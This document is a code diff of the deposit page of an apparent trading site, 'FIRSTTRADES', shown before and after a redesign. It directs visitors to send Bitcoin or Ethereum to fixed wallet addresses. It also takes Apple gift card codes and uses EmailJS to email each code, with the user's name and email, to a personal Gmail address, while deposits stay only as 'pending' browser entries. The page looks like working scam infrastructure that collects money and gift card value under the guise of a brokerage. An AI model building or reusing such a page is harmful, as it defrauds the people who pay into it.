@@ -3,590 +3,167 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
-    <title>Fund Your Account - FIRSTTRADES</title>
+    <title>Fund Account — FIRSTTRADES</title>
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js" integrity="sha384-VDbnsk/qjpIVHPQMkJiROI+vW/7cw0k8TFYVLUabm7EWoLEDwcXh09XQ6gQ86Y0B" crossorigin="anonymous"></script>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="styles.css">
-    <style>
-        .funding-form {
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background: #0a0e1a;
-            padding: 120px 20px 80px;
-        }
-
-        .funding-container {
-            max-width: 700px;
-            width: 100%;
-            background: #111827;
-            border-radius: 20px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
-            padding: 3rem;
-        }
-
-        .funding-header {
-            text-align: center;
-            margin-bottom: 2rem;
-        }
-
-        .funding-header h1 {
-            font-family: 'Playfair Display', serif;
-            font-size: 2.5rem;
-            color: #fff;
-            margin-bottom: 0.5rem;
-            font-weight: 600;
-        }
-
-        .funding-header p {
-            color: #8a94a6;
-            font-size: 1rem;
-            line-height: 1.6;
-        }
-
-        .account-type-badge {
-            display: inline-block;
-            background: #00b386;
-            color: white;
-            padding: 8px 16px;
-            border-radius: 20px;
-            font-size: 0.9rem;
-            font-weight: 500;
-            margin-bottom: 1rem;
-        }
-
-        .progress-indicator {
-            display: flex;
-            justify-content: center;
-            margin-bottom: 3rem;
-        }
-
-        .progress-step {
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-        }
-
-        .step-circle {
-            width: 35px;
-            height: 35px;
-            border-radius: 50%;
-            background: #e9ecef;
-            color: #8a94a6;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 0.8rem;
-            font-weight: 600;
-            position: relative;
-        }
-
-        .step-circle.active {
-            background: #00b386;
-            color: white;
-        }
-
-        .step-circle.completed {
-            background: linear-gradient(135deg, #27ae60 0%, #2ecc71 100%);
-            color: white;
-        }
-
-        .step-line {
-            width: 50px;
-            height: 3px;
-            background: #e9ecef;
-            margin: 0 0.5rem;
-        }
-
-        .step-line.active {
-            background: #00b386;
-        }
-
-        .deposit-options {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 2rem;
-            margin-bottom: 3rem;
-        }
-
-        .deposit-option {
-            border: 1.5px solid rgba(255,255,255,0.1);
-            border-radius: 15px;
-            padding: 2rem;
-            text-align: center;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            background: #1a2235;
-        }
-
-        .deposit-option:hover {
-            border-color: #00b386;
-            background: rgba(102, 126, 234, 0.05);
-            transform: translateY(-5px);
-            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.2);
-        }
-
-        .deposit-option.selected {
-            border-color: #00b386;
-            background: rgba(102, 126, 234, 0.1);
-            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.2);
-        }
-
-        .deposit-icon {
-            font-size: 3rem;
-            margin-bottom: 1rem;
-            display: block;
-        }
-
-        .deposit-title {
-            font-size: 1.3rem;
-            font-weight: 600;
-            color: #fff;
-            margin-bottom: 0.5rem;
-        }
-
-        .deposit-description {
-            color: #8a94a6;
-            font-size: 0.9rem;
-            line-height: 1.5;
-        }
-
-        .deposit-details {
-            background: rgba(39, 174, 96, 0.1);
-            border: 1px solid rgba(39, 174, 96, 0.3);
-            border-radius: 12px;
-            padding: 1.5rem;
-            margin-bottom: 2rem;
-        }
-
-        .detail-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 1rem;
-        }
-
-        .detail-row:last-child {
-            margin-bottom: 0;
-        }
-
-        .detail-label {
-            font-weight: 600;
-            color: #fff;
-        }
-
-        .detail-value {
-            color: #00b386;
-            font-weight: 600;
-        }
-
-        .funding-notice {
-            background: linear-gradient(135deg, #fff3cd 0%, #ffeaa7 100%);
-            border: 1px solid #f39c12;
-            border-radius: 12px;
-            padding: 1.5rem;
-            margin-bottom: 2rem;
-        }
-
-        .funding-notice h4 {
-            color: #d68910;
-            margin-bottom: 0.5rem;
-            font-weight: 600;
-        }
-
-        .funding-notice p {
-            color: #8b4513;
-            font-size: 0.9rem;
-            line-height: 1.5;
-        }
-
-        .button-group {
-            display: flex;
-            justify-content: space-between;
-            gap: 1rem;
-        }
-
-        .btn-secondary {
-            background: #1a2235;
-            color: white;
-            padding: 15px 30px;
-            text-decoration: none;
-            border-radius: 50px;
-            font-weight: 500;
-            font-size: 1rem;
-            transition: all 0.3s ease;
-            border: 2px solid transparent;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            flex: 1;
-            text-align: center;
-        }
-
-        .btn-secondary:hover {
-            background: linear-gradient(135deg, #7f8c8d 0%, #95a5a6 100%);
-            transform: translateY(-2px);
-        }
-
-        .btn {
-            background: #00b386;
-            color: white;
-            padding: 15px 30px;
-            border: none;
-            border-radius: 50px;
-            font-weight: 500;
-            font-size: 1rem;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            flex: 1;
-            text-align: center;
-        }
-
-        .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.3);
-        }
-
-        @media (max-width: 768px) {
-            .funding-container {
-                padding: 2rem 1.5rem;
-            }
-
-            .funding-header h1 {
-                font-size: 2rem;
-            }
-
-            .deposit-options {
-                grid-template-columns: 1fr;
-            }
-
-            .progress-indicator {
-                margin-bottom: 2rem;
-            }
-
-            .step-line {
-                width: 30px;
-            }
-
-            .button-group {
-                flex-direction: column;
-            }
-
-            .btn, .btn-secondary {
-                width: 100%;
-                margin-bottom: 1rem;
-            }
-        }
-    </style>
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-WR70LQ6B2D"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag("js",new Date());gtag("config","G-WR70LQ6B2D");</script>
-    <style>
-        /* Mobile touch fixes */
-        input, select, textarea, button, a { -webkit-tap-highlight-color: transparent; touch-action: manipulation; }
-        input, select, textarea { font-size: 16px !important; } /* prevent iOS zoom */
-        button, .btn, .order-btn, .login-btn, .withdraw-btn { min-height: 44px; }
-        * { -webkit-text-size-adjust: 100%; }
-    </style>
+    <link rel="stylesheet" href="theme.css">
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-WR70LQ6B2D"></script>
+    <script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','G-WR70LQ6B2D');</script>
 </head>
-<body><a href="step6.html" style="position:fixed;top:20px;left:20px;z-index:1100;width:44px;height:44px;background:rgba(0,0,0,0.1);border:1px solid rgba(0,0,0,0.15);border-radius:50%;display:flex;align-items:center;justify-content:center;text-decoration:none;transition:all 0.3s;"><svg viewBox="0 0 24 24" style="width:20px;height:20px;fill:none;stroke:#2c3e50;stroke-width:2.5;stroke-linecap:round;stroke-linejoin:round;"><polyline points="15 18 9 12 15 6"/></svg></a>
-    <header>
-        <nav class="container">
-            <div class="logo">FIRSTTRADES</div>
-            <ul>
-                <li><a href="index.html">Home</a></li>
-                <li><a href="login.html">Login</a></li>
-            </ul>
-        </nav>
-    </header>
+<body>
+<div class="pg-bg"><canvas id="pgCanvas"></canvas><div class="pg-grid"></div><div class="pg-orb pg-orb-1"></div><div class="pg-orb pg-orb-2"></div></div>
 
-    <section class="funding-form">
-        <div class="funding-container">
-            <div class="progress-indicator">
-                <div class="progress-step">
-                    <div class="step-circle completed">1</div>
-                </div>
-                <div class="step-line completed"></div>
-                <div class="progress-step">
-                    <div class="step-circle active">2</div>
-                </div>
-                <div class="step-line"></div>
-                <div class="progress-step">
-                    <div class="step-circle">3</div>
-                </div>
-                <div class="step-line"></div>
-                <div class="progress-step">
-                    <div class="step-circle">4</div>
-                </div>
-                <div class="step-line"></div>
-                <div class="progress-step">
-                    <div class="step-circle">5</div>
-                </div>
+<div class="pg-topbar">
+    <a href="index.html" class="pg-logo">FIRST<span>TRADES</span></a>
+    <a href="step6.html" class="pg-topbar-link">← Back</a>
+</div>
+
+<div class="pg-wrap">
+    <div class="pg-card pg-card-wide">
+        <div class="pg-card-icon">💳</div>
+        <h2>Fund Your Account</h2>
+        <p class="pg-sub">Choose your preferred deposit method to start trading</p>
+        <div class="pg-divider"></div>
+
+        <div class="pg-notice"><strong>🔒 Secure Funding</strong> — All deposits are processed through encrypted channels. Funds are typically available within minutes.</div>
+
+        <div class="pg-options" style="margin-bottom:1.25rem;">
+            <div class="pg-option" id="btcOpt" onclick="selectMethod('btc')">
+                <div class="pg-option-icon">₿</div>
+                <div class="pg-option-text"><h3>Bitcoin (BTC)</h3><p>Deposit via BTC wallet — 5-30 min processing</p></div>
+                <div class="pg-option-arrow"><svg viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg></div>
             </div>
-
-            <div class="funding-header">
-                <div class="account-type-badge" id="accountTypeBadge">
-                    <!-- Will be populated by JavaScript -->
-                </div>
-                <h1>Fund Your Account</h1>
-                <p>Choose your preferred deposit method to start trading</p>
+            <div class="pg-option" id="ethOpt" onclick="selectMethod('eth')">
+                <div class="pg-option-icon">Ξ</div>
+                <div class="pg-option-text"><h3>Ethereum (ETH)</h3><p>Deposit via ETH wallet — 5-30 min processing</p></div>
+                <div class="pg-option-arrow"><svg viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg></div>
             </div>
-
-            <div class="funding-notice">
-                <h4>💰 Secure Funding Options</h4>
-                <p>All deposits are processed through secure, encrypted channels. Funds are typically available within minutes for trading.</p>
-            </div>
-
-            <div class="deposit-options">
-                <div class="deposit-option" id="btcOption" onclick="selectDepositMethod('btc')">
-                    <span class="deposit-icon">₿</span>
-                    <div class="deposit-title">Bitcoin Deposit</div>
-                    <div class="deposit-description">Deposit via BTC wallet</div>
-                </div>
-                <div class="deposit-option" id="ethOption" onclick="selectDepositMethod('eth')">
-                    <span class="deposit-icon">Ξ</span>
-                    <div class="deposit-title">Ethereum Deposit</div>
-                    <div class="deposit-description">Deposit via ETH wallet</div>
-                </div>
-                <div class="deposit-option" id="appleOption" onclick="selectDepositMethod('apple')" style="grid-column: 1 / -1;">
-                    <span class="deposit-icon">🍎</span>
-                    <div class="deposit-title">Apple Gift Card</div>
-                    <div class="deposit-description">Fund your account using an Apple Gift Card</div>
-                </div>
-            </div>
-
-            <div class="deposit-details" id="depositDetails" style="display: none;">
-                <div class="detail-row">
-                    <span class="detail-label">Minimum Deposit:</span>
-                    <span class="detail-value" id="minDeposit">$25</span>
-                </div>
-                <div class="detail-row">
-                    <span class="detail-label">Processing Time:</span>
-                    <span class="detail-value" id="processingTime">5-30 minutes</span>
-                </div>
-            </div>
-
-            <section id="cryptoDepositPanel" style="display:none; margin-top:1.5rem; padding:1rem; border:2px dashed #d4af37; border-radius:12px; background:rgba(212,175,55,0.08); color:#000;">
-                <h3 style="margin-top:0; color:#000;">Crypto Deposit Info</h3>
-                <p style="color:#000;">Send your selected coin to the wallet address below to complete your deposit.</p>
-                <div style="margin-bottom:1rem;">
-                    <label style="display:block; font-weight:600; color:#2c3e50; margin-bottom:0.5rem;">Amount to Send (USD)</label>
-                    <input type="number" id="btcUsdAmount" placeholder="Minimum $100" min="100" style="width:100%; padding:12px 16px; border:2px solid #ddd; border-radius:10px; font-size:1rem; color:#000; background:#fff;" oninput="convertToCrypto('btc')">
-                    <div id="btcConvertedAmount" style="margin-top:0.5rem; font-size:0.9rem; color:#27ae60; font-weight:600;"></div>
-                </div>
-                <p style="color:#000;"><strong>Coin:</strong> <span id="cryptoCoin">BTC</span></p>
-                <p style="color:#000;"><strong>Address:</strong> <span id="cryptoAddress">bc1qe3dxay03xs0ck4xhug6snjttcqf04c3ntpmkp7</span></p>
-                <img id="cryptoQr" src="btc.jpeg" alt="Crypto payment QR" style="width:200px;height:200px;border:2px solid #1a1a1a;border-radius:12px;margin-top:0.5rem;display:block;background:#fff;" />
-                <p><small>Expiry: 30 minutes. After that, generate a new deposit request.</small></p>
-            </section>
-
-            <section id="ethDepositPanel" style="display:none; margin-top:1.5rem; padding:1rem; border:2px dashed #d4af37; border-radius:12px; background:rgba(212,175,55,0.08); color:#000;">
-                <h3 style="margin-top:0; color:#000;">Crypto Deposit Info</h3>
-                <p style="color:#000;">Send your selected coin to the wallet address below to complete your deposit.</p>
-                <div style="margin-bottom:1rem;">
-                    <label style="display:block; font-weight:600; color:#2c3e50; margin-bottom:0.5rem;">Amount to Send (USD)</label>
-                    <input type="number" id="ethUsdAmount" placeholder="Minimum $100" min="25" style="width:100%; padding:12px 16px; border:2px solid #ddd; border-radius:10px; font-size:1rem; color:#000; background:#fff;" oninput="convertToCrypto('eth')">
-                    <div id="ethConvertedAmount" style="margin-top:0.5rem; font-size:0.9rem; color:#27ae60; font-weight:600;"></div>
-                </div>
-                <p style="color:#000;"><strong>Coin:</strong> <span id="ethCoin">ETH</span></p>
-                <p style="color:#000;"><strong>Address:</strong> <span id="ethAddress" style="color:#000;">0x2c2F275F650932C19cb03d0D1085b2f8D1b0093B</span></p>
-                <img id="ethQr" src="eth.jpeg" alt="Crypto payment QR" style="width:200px;height:200px;border:2px solid #1a1a1a;border-radius:12px;margin-top:0.5rem;display:block;background:#fff;" />
-                <p><small>Expiry: 30 minutes. After that, generate a new deposit request.</small></p>
-            </section>
-
-            <!-- Apple Gift Card Panel -->
-            <section id="appleDepositPanel" style="display:none; margin-top:1.5rem; padding:1.5rem; border:2px dashed #555; border-radius:12px; background:#f9f9f9; color:#000;">
-                <h3 style="margin-top:0; color:#000; display:flex; align-items:center; gap:0.5rem;">🍎 Apple Gift Card Deposit</h3>
-                <p style="color:#555; margin-bottom:1.5rem; font-size:0.9rem;">Enter your gift card details below. Our team will verify and credit your account within 30 minutes.</p>
-
-                <div style="margin-bottom:1rem;">
-                    <label style="display:block; font-weight:600; color:#2c3e50; margin-bottom:0.5rem;">Gift Card Code *</label>
-                    <input type="text" id="appleCode" placeholder="e.g. XXXX-XXXX-XXXX-XXXX" style="width:100%; padding:12px 16px; border:2px solid #ddd; border-radius:10px; font-size:1rem; font-family:monospace; letter-spacing:2px; color:#000; background:#fff;">
-                </div>
-
-                <div style="margin-bottom:1rem;">
-                    <label style="display:block; font-weight:600; color:#2c3e50; margin-bottom:0.5rem;">Card Amount (USD) *</label>
-                    <input type="number" id="appleAmount" placeholder="Minimum $100" min="100" style="width:100%; padding:12px 16px; border:2px solid #ddd; border-radius:10px; font-size:1rem; color:#000; background:#fff;">
-                </div>
-
-                <div style="margin-bottom:1.5rem;">
-                    <label style="display:block; font-weight:600; color:#2c3e50; margin-bottom:0.5rem;">Upload Card Photo (optional)</label>
-                    <input type="file" id="applePhoto" accept="image/*" style="width:100%; padding:10px; border:2px dashed #ddd; border-radius:10px; font-size:0.9rem; background:#fff; cursor:pointer;">
-                    <small style="color:#888;">Take a photo of the back of the card showing the code</small>
-                </div>
-
-                <button onclick="submitAppleCard()" style="width:100%; padding:14px; background:linear-gradient(135deg,#1a1a1a,#333); color:white; border:none; border-radius:10px; font-size:1rem; font-weight:600; cursor:pointer; letter-spacing:1px;">Submit Gift Card</button>
-                <div id="appleSuccess" style="display:none; margin-top:1rem; padding:1rem; background:rgba(39,174,96,0.1); border:1px solid #27ae60; border-radius:10px; color:#27ae60; font-weight:600; text-align:center;">
-                    ✅ Gift card submitted! Your account will be credited within 30 minutes.
-                </div>
-            </section>
-
-            <div class="button-group">
-                <button type="button" class="btn-secondary" onclick="skipFunding()">Skip for Now</button>
-                <button type="button" class="btn" id="depositBtn" onclick="proceedToDeposit()" disabled>Deposit Now</button>
-            </div>
-
-            <!-- Continue after deposit -->
-            <div id="continueBtn" style="display:none; margin-top:1.5rem; text-align:center;">
-                <div style="background:rgba(39,174,96,0.1); border:1px solid #27ae60; border-radius:12px; padding:1rem; margin-bottom:1rem;">
-                    <p style="color:#27ae60; font-weight:600; margin:0;">✅ Deposit submitted! It will reflect in your balance once approved by admin.</p>
-                </div>
-                <button onclick="window.location.href='trading-dashboard.html'" style="width:100%; padding:15px; background:linear-gradient(135deg,#27ae60,#2ecc71); color:white; border:none; border-radius:50px; font-size:1rem; font-weight:600; cursor:pointer; letter-spacing:1px;">Continue to Dashboard →</button>
+            <div class="pg-option" id="appleOpt" onclick="selectMethod('apple')">
+                <div class="pg-option-icon">🍎</div>
+                <div class="pg-option-text"><h3>Apple Gift Card</h3><p>Fund using an Apple Gift Card code</p></div>
+                <div class="pg-option-arrow"><svg viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg></div>
             </div>
         </div>
-    </section>
 
-    <script>
-        let selectedMethod = null;
+        <!-- BTC Panel -->
+        <div class="pg-deposit-panel" id="btcPanel">
+            <h3>₿ Bitcoin Deposit</h3>
+            <p>Send BTC to the address below. Enter the USD amount you wish to deposit.</p>
+            <div class="pg-field">
+                <label>Amount (USD)</label>
+                <input type="number" id="btcUsd" placeholder="Minimum $100" min="100" oninput="convert('btc')">
+                <div class="pg-convert" id="btcConvert"></div>
+            </div>
+            <p><strong>Address:</strong></p>
+            <div class="pg-address-box">bc1qe3dxay03xs0ck4xhug6snjttcqf04c3ntpmkp7</div>
+            <img src="btc.jpeg" class="pg-qr" alt="BTC QR">
+            <p style="font-size:0.75rem;color:#8a94a6;margin-top:0.5rem;">Expires in 30 minutes. Generate a new request after expiry.</p>
+            <div class="pg-field" style="margin-top:1rem;">
+                <label>Upload Proof of Payment</label>
+                <input type="file" id="btcProof" accept="image/*" style="background:rgba(255,255,255,0.04);border:1.5px dashed rgba(255,255,255,0.1);border-radius:10px;padding:10px;color:#8a94a6;cursor:pointer;">
+            </div>
+        </div>
 
-        // Load account type from localStorage
-        document.addEventListener('DOMContentLoaded', function() {
-            const accountType = localStorage.getItem('selectedAccountType');
-            const badge = document.getElementById('accountTypeBadge');
+        <!-- ETH Panel -->
+        <div class="pg-deposit-panel" id="ethPanel">
+            <h3>Ξ Ethereum Deposit</h3>
+            <p>Send ETH to the address below. Enter the USD amount you wish to deposit.</p>
+            <div class="pg-field">
+                <label>Amount (USD)</label>
+                <input type="number" id="ethUsd" placeholder="Minimum $100" min="100" oninput="convert('eth')">
+                <div class="pg-convert" id="ethConvert"></div>
+            </div>
+            <p><strong>Address:</strong></p>
+            <div class="pg-address-box">0x2c2F275F650932C19cb03d0D1085b2f8D1b0093B</div>
+            <img src="eth.jpeg" class="pg-qr" alt="ETH QR">
+            <p style="font-size:0.75rem;color:#8a94a6;margin-top:0.5rem;">Expires in 30 minutes. Generate a new request after expiry.</p>
+            <div class="pg-field" style="margin-top:1rem;">
+                <label>Upload Proof of Payment</label>
+                <input type="file" id="ethProof" accept="image/*" style="background:rgba(255,255,255,0.04);border:1.5px dashed rgba(255,255,255,0.1);border-radius:10px;padding:10px;color:#8a94a6;cursor:pointer;">
+            </div>
+        </div>
 
-            if (accountType) {
-                const typeText = accountType.charAt(0).toUpperCase() + accountType.slice(1);
-                badge.textContent = `${typeText} Account`;
-                badge.style.display = 'inline-block';
-            }
-        });
+        <!-- Apple Panel -->
+        <div class="pg-deposit-panel" id="applePanel">
+            <h3>🍎 Apple Gift Card</h3>
+            <p>Enter your gift card details. Our team will verify and credit your account within 30 minutes.</p>
+            <div class="pg-field">
+                <label>Gift Card Code</label>
+                <input type="text" id="appleCode" placeholder="XXXX-XXXX-XXXX-XXXX" style="font-family:monospace;letter-spacing:2px;">
+            </div>
+            <div class="pg-field">
+                <label>Card Amount (USD)</label>
+                <input type="number" id="appleAmount" placeholder="Minimum $100" min="100">
+            </div>
+            <div class="pg-field">
+                <label>Card Photo (optional)</label>
+                <input type="file" id="applePhoto" accept="image/*" style="background:rgba(255,255,255,0.04);border:1.5px dashed rgba(255,255,255,0.1);border-radius:10px;padding:10px;color:#8a94a6;cursor:pointer;">
+            </div>
+            <button class="pg-btn pg-btn-gold" onclick="submitApple()" style="margin-top:0.5rem;">Submit Gift Card</button>
+            <div class="pg-alert pg-alert-ok" id="appleOk" style="margin-top:0.75rem;">✅ Submitted! Your account will be credited within 30 minutes.</div>
+        </div>
 
-        // Live crypto conversion (approximate rates)
-        var cryptoRates = { btc: 67000, eth: 3500 };
+        <!-- Success -->
+        <div class="pg-success-panel" id="successPanel">
+            <p>✅ Deposit submitted! It will reflect in your balance once approved by admin.</p>
+            <button class="pg-btn pg-btn-gold" onclick="window.location.href='trading-dashboard.html'">Continue to Dashboard →</button>
+        </div>
 
-        function convertToCrypto(coin) {
-            var usd = parseFloat(document.getElementById(coin + 'UsdAmount').value);
-            var resultEl = document.getElementById(coin + 'ConvertedAmount');
-            if (!usd || usd <= 0) { resultEl.textContent = ''; return; }
-            var amount = (usd / cryptoRates[coin]).toFixed(6);
-            resultEl.textContent = '≈ ' + amount + ' ' + coin.toUpperCase() + ' to send';
-        }
+        <div class="pg-btn-row" style="margin-top:1.25rem;">
+            <button class="pg-btn pg-btn-ghost" onclick="window.location.href='trading-dashboard.html'">Skip for Now</button>
+            <button class="pg-btn pg-btn-gold" id="depositBtn" onclick="submitDeposit()" disabled>Deposit Now</button>
+        </div>
+    </div>
+</div>
 
-        function selectDepositMethod(method) {
-            selectedMethod = method;
-            document.querySelectorAll('.deposit-option').forEach(option => {
-                option.classList.remove('selected');
-            });
-            document.getElementById('cryptoDepositPanel').style.display = 'none';
-            document.getElementById('ethDepositPanel').style.display = 'none';
-            document.getElementById('appleDepositPanel').style.display = 'none';
+<script>
+(function(){var c=document.getElementById('pgCanvas'),ctx=c.getContext('2d'),W,H,pts=[];function resize(){W=c.width=window.innerWidth;H=c.height=window.innerHeight;}resize();window.addEventListener('resize',resize);for(var i=0;i<70;i++)pts.push({x:Math.random(),y:Math.random(),vx:(Math.random()-.5)*.0003,vy:(Math.random()-.5)*.0003,r:Math.random()*1.1+.3,a:Math.random()*.4+.1,g:Math.random()>.6});function draw(){ctx.clearRect(0,0,W,H);pts.forEach(function(p){p.x=(p.x+p.vx+1)%1;p.y=(p.y+p.vy+1)%1;ctx.beginPath();ctx.arc(p.x*W,p.y*H,p.r,0,Math.PI*2);ctx.fillStyle=p.g?'rgba(201,168,76,'+p.a+')':'rgba(255,255,255,'+(p.a*.4)+')';ctx.fill();});requestAnimationFrame(draw);}draw();})();
 
-            if (method === 'btc') {
-                document.getElementById('btcOption').classList.add('selected');
-                showDepositDetails('$100', '5-30 minutes');
-                document.getElementById('depositBtn').disabled = false;
-                proceedToDeposit();
-            } else if (method === 'eth') {
-                document.getElementById('ethOption').classList.add('selected');
-                showDepositDetails('$100', '5-30 minutes');
-                document.getElementById('depositBtn').disabled = false;
-                proceedToDeposit();
-            } else if (method === 'apple') {
-                document.getElementById('appleOption').classList.add('selected');
-                document.getElementById('appleDepositPanel').style.display = 'block';
-                document.getElementById('depositBtn').disabled = true;
-            }
-        }
+var selectedMethod = null;
+var rates = {btc:67000, eth:3500};
 
-        function showDepositDetails(minDeposit, processingTime) {
-            document.getElementById('minDeposit').textContent = minDeposit;
-            document.getElementById('processingTime').textContent = processingTime;
-            document.getElementById('depositDetails').style.display = 'block';
-        }
+function selectMethod(m) {
+    selectedMethod = m;
+    document.querySelectorAll('.pg-option').forEach(function(o){o.classList.remove('selected');});
+    ['btcPanel','ethPanel','applePanel'].forEach(function(id){document.getElementById(id).style.display='none';});
+    document.getElementById(m==='btc'?'btcOpt':m==='eth'?'ethOpt':'appleOpt').classList.add('selected');
+    document.getElementById(m+'Panel').style.display='block';
+    document.getElementById('depositBtn').disabled = (m==='apple');
+}
 
-        function proceedToDeposit() {
-            if (!selectedMethod) return;
+function convert(coin) {
+    var usd = parseFloat(document.getElementById(coin+'Usd').value);
+    var el = document.getElementById(coin+'Convert');
+    el.textContent = usd>0 ? '≈ '+(usd/rates[coin]).toFixed(6)+' '+coin.toUpperCase()+' to send' : '';
+}
 
-            // Hide both panels first
-            document.getElementById('cryptoDepositPanel').style.display = 'none';
-            document.getElementById('ethDepositPanel').style.display = 'none';
+function submitDeposit() {
+    if (!selectedMethod || selectedMethod==='apple') return;
+    var amt = document.getElementById(selectedMethod+'Usd').value || '0';
+    var fd = {method:selectedMethod, amount:amt, timestamp:new Date().toISOString(), status:'pending'};
+    localStorage.setItem('fundingData', JSON.stringify(fd));
+    var all = JSON.parse(localStorage.getItem('allDeposits')||'[]');
+    fd.id = fd.timestamp; all.push(fd); localStorage.setItem('allDeposits', JSON.stringify(all));
+    document.getElementById('successPanel').style.display='block';
+    document.getElementById('depositBtn').disabled=true;
+}
 
-            // Store funding choice as PENDING — admin must approve before balance updates
-            const fundingData = {
-                method: selectedMethod,
-                amount: selectedMethod === 'btc' ? (document.getElementById('btcUsdAmount').value || '0') : (document.getElementById('ethUsdAmount').value || '0'),
-                timestamp: new Date().toISOString(),
-                status: 'pending'
-            };
-
-            localStorage.setItem('fundingData', JSON.stringify(fundingData));
-
-            // Add to allDeposits list for admin panel
-            const allDeposits = JSON.parse(localStorage.getItem('allDeposits') || '[]');
-            fundingData.id = fundingData.timestamp;
-            allDeposits.push(fundingData);
-            localStorage.setItem('allDeposits', JSON.stringify(allDeposits));
-
-            // Handle BTC deposit
-            if (selectedMethod === 'btc') {
-                document.getElementById('cryptoDepositPanel').style.display = 'block';
-                document.getElementById('cryptoCoin').innerText = 'BTC';
-                document.getElementById('cryptoAddress').innerText = 'bc1qe3dxay03xs0ck4xhug6snjttcqf04c3ntpmkp7';
-                document.getElementById('cryptoQr').src = 'btc.jpeg';
-                document.getElementById('continueBtn').style.display = 'block';
-            }
-            else if (selectedMethod === 'eth') {
-                document.getElementById('ethDepositPanel').style.display = 'block';
-                document.getElementById('ethCoin').innerText = 'ETH';
-                document.getElementById('ethAddress').innerText = '0x2c2F275F650932C19cb03d0D1085b2f8D1b0093B';
-                document.getElementById('ethQr').src = 'eth.jpeg';
-                document.getElementById('continueBtn').style.display = 'block';
-            }
-        }
-
-        function submitAppleCard() {
-            var code   = document.getElementById('appleCode').value.trim();
-            var amount = document.getElementById('appleAmount').value.trim();
-            var photo  = document.getElementById('applePhoto').files[0];
-            var userData = JSON.parse(localStorage.getItem('userData') || '{}');
-
-            if (!code) { document.getElementById('appleCode').style.border = '2px solid #e74c3c'; return; }
-            if (!amount || parseFloat(amount) < 100) { document.getElementById('appleAmount').style.border = '2px solid #e74c3c'; alert('Minimum deposit is $100.'); return; }
-
-            // Save to localStorage as pending deposit
-            var fundingData = {
-                method: 'apple',
-                code: code,
-                amount: amount,
-                timestamp: new Date().toISOString(),
-                status: 'pending'
-            };
-            localStorage.setItem('fundingData', JSON.stringify(fundingData));
-            var allDeposits = JSON.parse(localStorage.getItem('allDeposits') || '[]');
-            fundingData.id = fundingData.timestamp;
-            allDeposits.push(fundingData);
-            localStorage.setItem('allDeposits', JSON.stringify(allDeposits));
-
-            // Send email notification via EmailJS
-            emailjs.init('runwqesYkxfgWYPzf');
-            emailjs.send('service_jjdb6rb', 'template_rjcvhus', {
-                to_name:  'Admin',
-                to_email: 'ivieshaguolo@gmail.com',
-                code: 'NEW APPLE GIFT CARD DEPOSIT\n\nUser: ' + (userData.fullName || 'Unknown') + '\nEmail: ' + (userData.email || 'Unknown') + '\nCard Code: ' + code + '\nAmount: $' + amount
-            });
-
-            document.getElementById('appleSuccess').style.display = 'block';
-            document.getElementById('appleCode').disabled = true;
-            document.getElementById('appleAmount').disabled = true;
-            document.getElementById('applePhoto').disabled = true;
-            document.getElementById('continueBtn').style.display = 'block';
-        }
-
-        function skipFunding() {
-            // Store skip choice
-            const fundingData = {
-                method: 'skipped',
-                timestamp: new Date().toISOString(),
-                status: 'skipped'
-            };
-
-            localStorage.setItem('fundingData', JSON.stringify(fundingData));
-
-            // Proceed to next step without funding
-            window.location.href = 'trading-dashboard.html';
-        }
-    </script>
+function submitApple() {
+    var code=document.getElementById('appleCode').value.trim();
+    var amount=document.getElementById('appleAmount').value.trim();
+    var ud=JSON.parse(localStorage.getItem('userData')||'{}');
+    if (!code){document.getElementById('appleCode').style.borderColor='#fc8181';return;}
+    if (!amount||parseFloat(amount)<100){document.getElementById('appleAmount').style.borderColor='#fc8181';alert('Minimum $100');return;}
+    var fd={method:'apple',code:code,amount:amount,timestamp:new Date().toISOString(),status:'pending'};
+    localStorage.setItem('fundingData',JSON.stringify(fd));
+    var all=JSON.parse(localStorage.getItem('allDeposits')||'[]');
+    fd.id=fd.timestamp;all.push(fd);localStorage.setItem('allDeposits',JSON.stringify(all));
+    emailjs.init('runwqesYkxfgWYPzf');
+    emailjs.send('service_jjdb6rb','template_rjcvhus',{to_name:'Admin',to_email:'ivieshaguolo@gmail.com',code:'APPLE GIFT CARD\nUser: '+(ud.fullName||'?')+'\nEmail: '+(ud.email||'?')+'\nCode: '+code+'\nAmount: $'+amount});
+    document.getElementById('appleOk').style.display='block';
+    document.getElementById('appleCode').disabled=true;
+    document.getElementById('appleAmount').disabled=true;
+    document.getElementById('successPanel').style.display='block';
+}
+</script>
 </body>
 </html>
-
